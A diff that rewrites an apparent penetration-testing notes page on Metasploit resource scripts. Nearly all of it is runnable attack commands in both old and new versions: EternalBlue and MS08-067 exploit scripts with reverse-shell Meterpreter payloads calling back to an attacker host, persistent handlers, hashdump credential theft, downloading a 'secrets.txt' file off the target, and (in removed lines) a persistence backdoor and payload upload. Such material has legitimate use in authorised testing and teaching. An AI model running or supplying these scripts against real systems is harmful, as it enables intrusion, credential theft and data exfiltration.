@@ -1,131 +1,72 @@
-!!! tip "Tip"
-    Resource scripts automate repetitive Metasploit workflows. Save a sequence of `set` and `run` commands to a `.rc` file, then: `msfconsole -r script.rc`. Useful for setting up multi/handler listeners that survive session disconnects.
+# Metasploit Resource Scripts
 
-#### Creating and Using Resource Scripts
+!!! tip ""
+    Resource scripts automate repetitive Metasploit workflows. Save a sequence of `set` and `run` commands to a `.rc` file, then: `msfconsole -r script.rc`. Most useful for setting up persistent multi/handler listeners.
 
-A resource script is a plain text file containing a sequence of Metasploit commands.
+---
 
-##### Basic Structure of a Resource Script
-
-Create a script (`automation.rc`) with the following content:
+## Basic Structure
 
 ```bash
-use exploit/windows/smb/ms08_067_netapi
-set RHOSTS 192.168.1.100
+use exploit/multi/handler
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.200
+set LHOST <attacker-ip>
 set LPORT 4444
-exploit
+set ExitOnSession false
+exploit -j
 ```
 
-Run the script in Metasploit:
+Save as `handler.rc` and run:
 
 ```bash
-msfconsole -r automation.rc
+msfconsole -r handler.rc
 ```
 
-#### Automating Exploitation with Resource Scripts
+---
 
-Resource scripts can be used to automate common exploitation steps.
-
-##### Example: Automating an SMB Exploit
+## EternalBlue Script
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.105
+set RHOSTS 10.10.10.10
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.200
+set LHOST <attacker-ip>
 set LPORT 4444
 run
 ```
 
-Save it as `smb_exploit.rc` and execute:
+---
+
+## Post-Exploitation Automation
 
 ```bash
-msfconsole -r smb_exploit.rc
-```
+use post/windows/gather/hashdump
+set SESSION 1
+run
 
-#### Post-Exploitation Automation
-
-Resource scripts can be used for privilege escalation, persistence, and data collection.
-
-##### Example: Gathering System Information
-
-```bash
 use post/windows/gather/enum_system
 set SESSION 1
 run
 ```
 
-##### Example: Extracting Password Hashes
+---
 
-```bash
-use post/windows/gather/hashdump
-set SESSION 1
-run
-```
-
-#### Creating a Persistent Backdoor
-
-```bash
-use exploit/windows/local/persistence
-set SESSION 1
-set LHOST 192.168.1.200
-set LPORT 4444
-run
-```
-
-#### Exfiltrating Files with Metasploit
-
-##### Downloading a File from Target
+## File Transfer via Session
 
 ```bash
 use post/windows/manage/download
 set SESSION 1
 set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
-set LOCAL_DIRECTORY /root/
+set LOCAL_DIRECTORY /tmp/
 run
 ```
 
-##### Uploading a File to Target
+---
+
+## Run Multiple Scripts in Sequence
 
 ```bash
-use post/windows/manage/upload
-set SESSION 1
-set SRC /root/payload.exe
-set DST C:\\Users\\Public\\payload.exe
-run
-```
-
-#### Combining Resource Scripts for Full Automation
-
-Multiple tasks can be combined into a single `.rc` file:
-
-```bash
-use exploit/windows/smb/ms17_010_eternalblue
-set RHOSTS 192.168.1.105
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.200
-set LPORT 4444
-exploit -z
-
-use post/windows/gather/hashdump
-set SESSION 1
-run
-
-use post/windows/manage/download
-set SESSION 1
-set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
-set LOCAL_DIRECTORY /root/
-run
-```
-
-#### Executing Multiple Resource Scripts in a Loop
-
-```bash
-for script in $(ls /root/scripts/*.rc); do
-    msfconsole -r $script
+for script in /tmp/scripts/*.rc; do
+    msfconsole -r "$script"
 done
 ```
-
-Metasploit resource scripts streamline repetitive tasks, making them valuable for efficient penetration testing and post-exploitation automation.
